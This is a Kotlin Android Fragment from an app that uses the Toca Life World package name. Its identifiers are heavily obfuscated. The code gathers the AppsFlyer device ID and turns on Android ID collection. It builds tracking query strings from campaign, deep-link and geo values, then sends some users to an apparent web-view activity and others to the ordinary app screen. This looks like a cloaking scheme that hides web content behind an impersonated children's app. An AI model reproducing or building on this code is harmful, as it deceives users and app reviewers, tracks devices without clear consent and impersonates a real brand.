package com.tocaboca.tocalifeworldo.nhgjy
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.fppclvpp
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.icicoxovoijbhub
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.bnjiijijb
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.fjiejikooskakokox
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.vfkovoc
import org.koin.android.ext.android.inject
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.wkooks
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.rplep
import org.koin.core.qualifier.named
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.sowkooksokxkcji
import androidx.fragment.app.Fragment
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.rpelwplslpadkojixjic
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.wplsl
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.cpld
import android.content.Context
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.bijnjijihuvyggydf
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.feprel
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.ttvcyycuhh

import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.ncnjvkvkobiji
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.dookijbhub
import com.tocaboca.tocalifeworldo.wwsasd.ucixj.Uwowosixcs.fokrdslpasd
import android.os.Bundle
import com.appsflyer.AppsFlyerLib
import com.tocaboca.tocalifeworldo.R
import com.tocaboca.tocalifeworldo.mxuhcx.Jwuwystttxrzcsd
import com.tocaboca.tocalifeworldo.wwsasd.Saokxkkcuhuhvcc
class Cidicuytfvdfdf : Fragment() {
    val sjwijis: SharedPreferences by inject(named("SharedPreferences"))
    private lateinit var okokoxckojivuhbgy: Context



    override fun onStart() {
        super.onStart()
        val hcjibokkocvokijd = Intent(activity, Saokxkkcuhuhvcc::class.java)
        val eplwpq = sjwijis.getString("mainId", null)
        val jicxjivuokocxkovdji = Intent(activity, Jwuwystttxrzcsd::class.java)
        val rleplpkowkos = sjwijis.getString(ttvcyycuhh, null)
        val fkorokekos = AppsFlyerLib.getInstance().getAppsFlyerUID(okokoxckojivuhbgy)
        val alpzlposkod = sjwijis.getString(sowkooksokxkcji, null)

        val ncmcxmov = sjwijis.getString(wplsl, null)
        val eplpqp = sjwijis.getString("deepSt", null)
        val nnkjkvijbuhfgyd = Build.VERSION.RELEASE
        sjwijis.edit().putString(fokrdslpasd, fkorokekos).apply()

        val ujcjixivko = sjwijis.getString(dookijbhub, null)
        val gkovokckob = sjwijis.getString("appCamp", null)
        val wplslppla: String? = sjwijis.getString(fppclvpp, null)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val delpwlplpwoksjid = "com.tocaboca.tocalifeworldo"
        val htcrxvi = sjwijis.getString(cpld, null)


        val gkotokr = "$rleplpkowkos$wkooks$gkovokckob&$ncnjvkvkobiji$fkorokekos&$bnjiijijb$eplwpq&$icicoxovoijbhub$delpwlplpwoksjid&$rplep$nnkjkvijbuhfgyd&$vfkovoc$rpelwplslpadkojixjic"
        val cokxvko = "$rleplpkowkos$ncnjvkvkobiji$htcrxvi&$bnjiijijb$wplslppla&$icicoxovoijbhub$delpwlplpwoksjid&$rplep$nnkjkvijbuhfgyd&$vfkovoc$rpelwplslpadkojixjic"
        val apqllpa = "$rleplpkowkos$wkooks$eplpqp&$ncnjvkvkobiji$fkorokekos&$bnjiijijb$eplwpq&$icicoxovoijbhub$delpwlplpwoksjid&$rplep$nnkjkvijbuhfgyd&$vfkovoc$fjiejikooskakokox"
        val jsjidjixzchuxzgysd = "$rleplpkowkos$wkooks$eplpqp&$ncnjvkvkobiji$htcrxvi&$bnjiijijb$wplslppla&$icicoxovoijbhub$delpwlplpwoksjid&$rplep$nnkjkvijbuhfgyd&$vfkovoc$fjiejikooskakokox"

        when(ujcjixivko) {
            "1" ->
                if(gkovokckob!!.contains(bijnjijihuvyggydf)) {
                    sjwijis.edit().putString(feprel, gkotokr).apply()
                    sjwijis.edit().putString("WebInt", "campaign").apply()
                    startActivity(hcjibokkocvokijd)
                    activity?.finish()
                } else if (eplpqp!=null||alpzlposkod!!.contains(ncmcxmov.toString())) {
                    sjwijis.edit().putString(feprel, apqllpa).apply()
                    sjwijis.edit().putString("WebInt", "deepLink").apply()
                    startActivity(hcjibokkocvokijd)
                    activity?.finish()
                } else {
                    startActivity(jicxjivuokocxkovdji)
                    activity?.finish()
                }
            "0" ->
                if(eplpqp!=null) {
                    sjwijis.edit().putString(feprel, jsjidjixzchuxzgysd).apply()
                    sjwijis.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(hcjibokkocvokijd)
                    activity?.finish()
                } else if (alpzlposkod!!.contains(ncmcxmov.toString())) {
                    sjwijis.edit().putString(feprel, cokxvko).apply()
                    sjwijis.edit().putString("WebInt", "geo").apply()
                    startActivity(hcjibokkocvokijd)
                    activity?.finish()
                } else {
                    startActivity(jicxjivuokocxkovdji)
                    activity?.finish()
                }
        }
    }



    override fun onAttach(context: Context) {
        super.onAttach(context)
        okokoxckojivuhbgy = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.hxjkcxo, container, false)
    }








}
